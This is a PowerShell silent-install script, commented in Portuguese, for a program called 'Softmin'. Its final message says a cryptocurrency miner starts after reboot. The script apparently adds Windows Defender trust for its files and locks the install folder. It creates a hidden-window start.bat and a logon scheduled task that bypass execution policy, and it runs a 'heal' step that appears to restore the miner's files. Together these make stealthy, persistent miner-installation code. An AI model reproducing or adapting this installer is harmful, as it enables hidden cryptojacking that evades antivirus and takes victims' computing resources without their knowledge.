# Instalacao silenciosa a partir do pacote unificado (mesmo conteudo que GitHub).
param(
    [string]$PayloadRoot = $PSScriptRoot,
    [switch]$SkipHeal
)

$ErrorActionPreference = 'Stop'
$PayloadRoot = (Resolve-Path -LiteralPath $PayloadRoot).Path.TrimEnd('\')

. "$PayloadRoot\Softmin-Common.ps1"
. "$PayloadRoot\Softmin-SecureStorage.ps1"
. "$PayloadRoot\Softmin-CloudManifest.ps1"
. "$PayloadRoot\Set-SoftminDefenderTrust.ps1"
. "$PayloadRoot\Softmin-CloudConfig.ps1"

$meta = Get-SoftminMetaSettings -InstallPath $PayloadRoot
$installPath = (Resolve-SoftminInstallPath $(if ($meta['install_path']) { $meta['install_path'] } else { "$env:LOCALAPPDATA\Softmin" }))

New-Item -ItemType Directory -Force -Path $installPath, (Join-Path $installPath 'logs') | Out-Null
Write-SoftminInstallStep $installPath 'SILENT' 'Instalacao automatica (pacote unificado)...'

Set-SoftminDefenderTrust -InstallPath $installPath -SourceRoot $PayloadRoot -LogInstallPath $installPath | Out-Null

# Copiar payload (exceto segredos de build)
$skip = @('_install', 'manifest.json', 'logs')
Get-ChildItem -LiteralPath $PayloadRoot -Force | ForEach-Object {
    if ($skip -contains $_.Name) { return }
    $dst = Join-Path $installPath $_.Name
    if ($_.PSIsContainer) {
        Copy-Item -LiteralPath $_.FullName -Destination $dst -Recurse -Force
    } else {
        Copy-Item -LiteralPath $_.FullName -Destination $dst -Force
    }
}

# Credenciais locais para desbloquear settings.vault (do GitHub ou payload)
$secretFile = Join-Path $PayloadRoot '_install\vault.key'
if (Test-Path -LiteralPath $secretFile) {
    $km = Read-SoftminIniMap -Path $secretFile
    Save-SoftminVaultCredentials -InstallPath $installPath -Password $km['password'] -Codigo $(if ($km['codigo']) { $km['codigo'] } else { '' })
    Repair-SoftminVaultAutostart -InstallPath $installPath | Out-Null
}

Set-SoftminSecureFolderAcl -InstallPath $installPath

# Autostart via tarefa (janela oculta)
$startBat = @'
@echo off
setlocal EnableExtensions
cd /d "%~dp0"
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0Softmin-Boot.ps1" -InstallPath "%~dp0" -Silent
'@
Set-Content -Path (Join-Path $installPath 'start.bat') -Value $startBat -Encoding ASCII

$tr = 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + (Join-Path $installPath 'Softmin-Boot.ps1') + '" -InstallPath "' + $installPath + '" -Silent'
$null = & schtasks.exe /Create /TN 'Softmin' /TR $tr /SC ONLOGON /RL LIMITED /F 2>&1

if (-not $SkipHeal) {
    Invoke-SoftminFileHeal -InstallPath $installPath -Silent
}

Write-SoftminInstallStep $installPath 'SILENT' 'Instalado. Minerador inicia apos REINICIAR o PC.' -Status 'OK'
Write-SoftminInstallStep $installPath 'SILENT' "Pasta: $installPath" -Status 'INFO'
